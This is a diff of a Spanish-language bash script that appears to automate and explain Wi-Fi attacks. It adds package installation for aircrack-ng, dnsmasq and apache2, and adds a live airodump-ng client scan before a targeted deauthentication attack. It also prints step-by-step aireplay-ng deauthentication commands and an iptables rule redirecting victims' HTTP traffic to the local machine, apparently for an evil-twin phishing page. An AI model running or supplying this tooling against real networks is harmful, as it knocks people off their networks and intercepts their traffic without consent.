@@ -3,6 +3,43 @@
 # Autor: ING. Angel Gil -- The_White_Hat_?
 # Script de Explicación Avanzada sobre Redes y Seguridad - Versión Automatizada
 
+# Función para verificar e instalar requisitos
+check_requirements() {
+    printf "\n\033[1;33mVerificando requisitos...\033[0m\n"
+    local packages=("mysql-server" "apache2" "aircrack-ng" "dnsmasq" "wget" "unzip")
+    local missing=()
+
+    for pkg in "${packages[@]}"; do
+        if ! dpkg -l | grep -q " $pkg "; then
+            missing+=("$pkg")
+        fi
+    done
+
+    if [ ${#missing[@]} -eq 0 ]; then
+        printf "\033[1;32mTodos los requisitos están instalados.\033[0m\n"
+    else
+        printf "\033[1;31mFaltan los siguientes paquetes: ${missing[*]}\033[0m\n"
+        printf "\033[1;34m¿Desea instalarlos ahora? (s/n): \033[0m"
+        read -r install
+        if [[ "$install" =~ ^[sS]$ ]]; then
+            printf "\n\033[1;33mActualizando lista de paquetes...\033[0m\n"
+            sudo apt update
+            for pkg in "${missing[@]}"; do
+                printf "\n\033[1;33mInstalando $pkg...\033[0m\n"
+                sudo apt install -y "$pkg"
+                if [ $? -eq 0 ]; then
+                    printf "\033[1;32m$pkg instalado correctamente.\033[0m\n"
+                else
+                    printf "\033[1;31mError al instalar $pkg. Verifique su conexión o permisos.\033[0m\n"
+                    exit 1
+                fi
+            done
+        else
+            printf "\033[1;31mNo se instalarán los paquetes faltantes. El script podría no funcionar correctamente.\033[0m\n"
+        fi
+    fi
+}
+
 # Función para detectar adaptadores de red disponibles
 detect_network_adapters() {
     printf "\n\033[1;33mDetectando adaptadores de red disponibles...\033[0m\n"
@@ -142,7 +179,9 @@ configure_deauth() {
     read -r deauth_type
 
     if [ "$deauth_type" -eq 2 ]; then
-        printf "\n\033[1;34mIngrese la dirección MAC del cliente (ejemplo: 62:0E:1C:D1:1D:69): \033[0m"
+        printf "\n\033[1;33mEscaneando clientes conectados al AP $bssid en canal $channel. Presione Ctrl+C cuando haya seleccionado un cliente.\033[0m\n"
+        airodump-ng --bssid "$bssid" --channel "$channel" "$MONITOR_ADAPTER"
+        printf "\n\033[1;34mIngrese la dirección MAC del cliente (ejemplo: 62:0E:1C:D1:1D:69, ver columna STATION): \033[0m"
         read -r client_mac
         if ! [[ "$client_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
             printf "\033[1;31mMAC del cliente inválida. Debe tener el formato XX:XX:XX:XX:XX:XX.\033[0m\n"
@@ -419,7 +458,7 @@ explain_interface() {
 
     printf "\n🔹 \033[1;33mPaso 10: Redirigir tráfico HTTP\033[0m\n"
     printf "  📌 Comando: \033[1;32msudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80\033[0m\n"
-    printf "  ➜ Redirige el tráfico HTTP a la IP local.\n"
+    printf "  ➜ Redirige el tráfico HTTP a la IP local del sistema.\n"
 
     printf "\n🔹 \033[1;33mPaso 11: Enmascarar tráfico de salida\033[0m\n"
     printf "  📌 Comando: \033[1;32msudo iptables -t nat -A POSTROUTING -j MASQUERADE\033[0m\n"
@@ -450,17 +489,21 @@ explain_deauth() {
 
     printf "\n🔹 \033[1;33mPaso 3: Escanear redes cercanas\033[0m\n"
     printf "  📌 Comando: \033[1;32mairodump-ng [MONITOR_ADAPTER]\033[0m\n"
-    printf "  ➜ Muestra las redes disponibles. Anote el BSSID y el canal (columna CH) de la red objetivo, y si aplica, la MAC del cliente (columna STATION).\n"
+    printf "  ➜ Muestra las redes disponibles. Anote el BSSID y el canal (columna CH) de la red objetivo.\n"
 
     printf "\n🔹 \033[1;33mPaso 4: Configurar el canal del adaptador\033[0m\n"
     printf "  📌 Comando: \033[1;32miwconfig [MONITOR_ADAPTER] channel [CANAL]\033[0m\n"
     printf "  ➜ Ajusta el adaptador al canal del AP objetivo.\n"
 
-    printf "\n🔹 \033[1;33mPaso 5: Ataque de desautenticación a todos los clientes\033[0m\n"
+    printf "\n🔹 \033[1;33mPaso 5: Escanear clientes del AP seleccionado\033[0m\n"
+    printf "  📌 Comando: \033[1;32mairodump-ng --bssid [BSSID] --channel [CANAL] [MONITOR_ADAPTER]\033[0m\n"
+    printf "  ➜ Muestra los clientes conectados al AP especificado. Anote la MAC del cliente (columna STATION).\n"
+
+    printf "\n🔹 \033[1;33mPaso 6: Ataque de desautenticación a todos los clientes\033[0m\n"
     printf "  📌 Comando: \033[1;32maireplay-ng -0 [PAQUETES] -a [BSSID] [MONITOR_ADAPTER]\033[0m\n"
     printf "  ➜ Envía [PAQUETES] paquetes de desautenticación a todos los clientes del AP identificado por [BSSID]. Use 0 para infinito.\n"
 
-    printf "\n🔹 \033[1;33mPaso 6: Ataque de desautenticación a un cliente específico\033[0m\n"
+    printf "\n🔹 \033[1;33mPaso 7: Ataque de desautenticación a un cliente específico\033[0m\n"
     printf "  📌 Comando: \033[1;32maireplay-ng -0 [PAQUETES] -a [BSSID] -c [MAC_CLIENTE] [MONITOR_ADAPTER]\033[0m\n"
     printf "  ➜ Envía [PAQUETES] paquetes de desautenticación al cliente [MAC_CLIENTE] conectado al AP [BSSID].\n"
 
@@ -503,6 +546,9 @@ explain_web_creation() {
     printf "\n\033[1;34mPresione Enter para volver al menú...\033[0m"
     read -r
 }
+
+# Verificar requisitos al inicio
+check_requirements
 
 # Seleccionar adaptador al inicio
 select_adapter
